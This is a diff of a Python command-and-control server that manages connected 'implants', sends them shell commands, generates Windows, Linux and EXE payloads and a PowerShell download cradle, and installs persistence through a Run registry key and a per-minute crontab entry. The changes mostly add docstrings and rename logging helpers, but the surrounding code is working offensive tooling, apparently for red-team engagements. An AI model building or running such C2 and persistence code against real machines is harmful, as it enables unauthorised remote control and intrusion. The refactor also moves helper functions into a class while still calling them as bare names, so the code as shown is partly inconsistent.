@@ -2,7 +2,6 @@
 
 import base64
 import os
-import pyfiglet
 import random
 import shutil
 import socket
@@ -15,6 +14,7 @@ from colorama import *
 from prettytable import PrettyTable
 from Config import design
 from Config import colours
+from Config.colours import *
 
 
 def banner():
@@ -24,20 +24,32 @@ def banner():
 def help():
     design.help()
 
-def success(function):
-    colours.success(function)
 
-def error(function):
-    colours.error(function)
+class Colours:
 
-def info(function):
-    colours.info(function)
+    def success(function):
+        colours.success(function)
 
-def quit(function):
-    colours.quit(function)
+    def error(function):
+        colours.error(function)
+
+    def info(function):
+        colours.info(function)
+
+    def quit(function):
+        colours.quit(function)
+
+    def process(function):
+        colours.process(function)
 
 
 def comm_in(targ_id):
+    """
+    Accepts connection from implants
+    :param targ_id:
+    :return:
+    """
+
     info("Waiting for Response..\n")
     response = targ_id.recv(4096).decode()
     response = base64.b64decode(response)
@@ -46,18 +58,40 @@ def comm_in(targ_id):
 
 
 def comm_out(targ_id, message):
+    """
+    Sends commands to implants
+    :param targ_id:
+    :param message:
+    :return:
+    """
+
     message = str(message)
     message = base64.b64encode(bytes(message, encoding='utf-8'))
     targ_id.send(message)
 
 
 def kill_sig(targ_id, message):
+    """
+    Sends kill command to implants
+    :param targ_id:
+    :param message:
+    :return:
+    """
+
     message = str(message)
     message = base64.b64encode(bytes(message, encoding='utf-8'))
     targ_id.send(message)
 
 
 def target_comm(targ_id, targets, num):
+    """
+    Handles communication with implants
+    :param targ_id:
+    :param targets:
+    :param num:
+    :return:
+    """
+
     while True:
         message = input(Fore.YELLOW + f"{targets[num][3]}@{targets[num][1]}$ " + Style.RESET_ALL)
         comm_out(targ_id, message)
@@ -90,24 +124,25 @@ def target_comm(targ_id, targets, num):
                     persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                     targ_id.send(persist_command_1.encode())
                     # Command 2
-                    persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
+                    persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion' \
+                                        f'\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                     targ_id.send(persist_command_2.encode())
 
                     # Always keep a command to clean up endpoints after an engagement
-                    print(
-                        Fore.GREEN + "[+] Run this command to cleanup the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f" + Style.RESET_ALL)
+                    process("Run this command to cleanup the registry: \nreg delete "
+                            "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
 
                 if targets[num][6] == 2:
                     persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                     targ_id.send(persist_command.encode())
-                    success("Run this command to clean up crontab: \n crontab -r")
+                    process("Run this command to clean up crontab: \n crontab -r")
 
                 success("Persistence Technique Completed")
 
             else:
                 response = comm_in(targ_id)
                 if response == 'exit':
-                    error("[-] Client Connection Closed")
+                    error("Client Connection Closed")
                     targ_id.close()
                     break
 
@@ -115,14 +150,24 @@ def target_comm(targ_id, targets, num):
 
 
 def listener_handler():
+    """
+    Handles connections and threads them
+    :return:
+    """
+
     sock.bind((host_ip, int(host_port)))
-    info('Awaiting connection from client...\n')
+    process('Awaiting connection from client...\n')
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
     t1.start()
 
 
 def comm_handler():
+    """
+    Generates table parameters and handles communication
+    :return:
+    """
+
     while True:
 
         # If KeyboardInterrupt is issued then kill connection
@@ -162,7 +207,7 @@ def comm_handler():
             # Time
             cur_time = time.strftime("%H:%M:%S", time.localtime())
             date = datetime.now()
-            time_record = (f"{date.day}/{date.month}/{date.year} {cur_time}")
+            time_record = f"{date.day}/{date.month}/{date.year} {cur_time}"
             host_name = socket.gethostbyaddr(remote_ip[0])
 
             # Add to table
@@ -201,12 +246,17 @@ def comm_handler():
                       f'Client@{host_ip}$ ' +
                       Style.RESET_ALL, end='')
 
-        except:
+        except Exception:
             pass
 
 
 # Windows Payloads
 def winplant():
+    """
+    Windows Payload Generator
+    :return:
+    """
+
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
     generated = f'Generated Payloads\\{file_name}'
@@ -237,6 +287,11 @@ def winplant():
 
 # Linux Payloads
 def linplant():
+    """
+    Linux Payload Generator
+    :return:
+    """
+
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
     generated = f'Generated Payloads\\{file_name}'
@@ -267,6 +322,11 @@ def linplant():
 
 # EXE Payloads
 def exeplant():
+    """
+    EXE Payload Generator
+    :return:
+    """
+
     ran_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
     file_name = f'{ran_name}.py'
     exe_file = f'{ran_name}.exe'
@@ -317,6 +377,11 @@ def exeplant():
 
 # Powershell Cradle
 def pshell_cradle():
+    """
+    Powershell Cradle Generator
+    :return:
+    """
+
     web_server_ip = input(Fore.BLUE + "[i] Web Server Listening Host: " + Style.RESET_ALL)
     web_server_port = input(Fore.BLUE + "[i] Web Server Listening Port: " + Style.RESET_ALL)
     payload_name = input(Fore.BLUE + "[i] Payload Name: " + Style.RESET_ALL)
@@ -348,8 +413,9 @@ if __name__ == "__main__":
     banner()
     # Create Payloads Directory
     if not os.path.exists('Generated Payloads'):
-        info("Creating Generated Payloads Directory...")
+        process("Creating Generated Payloads Directory...")
         os.mkdir('Generated Payloads')
+        success("Generated Payloads Directory Created")
 
     # Count Variables
     kill_flag = 0
@@ -442,7 +508,7 @@ if __name__ == "__main__":
                         if (targets[num])[7] == 'Active':
                             target_comm(targ_id, targets, num)
                         else:
-                            error(f"The Dead Don't Talk - Cannot communicate with agent")
+                            error("The Dead Don't Talk - Cannot communicate with agent")
                     except IndexError:
                         error(f"Session {num} does not exist")
 
@@ -468,7 +534,7 @@ if __name__ == "__main__":
                     Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
                 if quit_message == 'y' or quit_message == 'yes':
                     # Delete Payloads
-                    info("Deleting Payloads")
+                    process("Deleting Payloads")
                     shutil.rmtree('Generated Payloads')
                     tar_length = len(targets)
                     for target in targets:
@@ -479,7 +545,7 @@ if __name__ == "__main__":
                     kill_flag = 1
                     if listener_counter > 0:
                         sock.close()
-                    print(Fore.LIGHTRED_EX + f"Quitting..." + Style.RESET_ALL)
+                    quit("Quitting...")
                     break
 
         except KeyboardInterrupt:
@@ -488,7 +554,7 @@ if __name__ == "__main__":
             if quit_message == 'y' or quit_message == 'yes':
                 tar_length = len(targets)
                 # Delete Payloads
-                info("Deleting Payloads")
+                process("Deleting Payloads")
                 shutil.rmtree('Generated Payloads')
                 for target in targets:
                     if target[7] == 'Dead':
@@ -498,7 +564,7 @@ if __name__ == "__main__":
                 kill_flag = 1
                 if listener_counter > 0:
                     sock.close()
-                quit(f"Quitting...")
+                quit("Quitting...")
                 break
             else:
                 continue
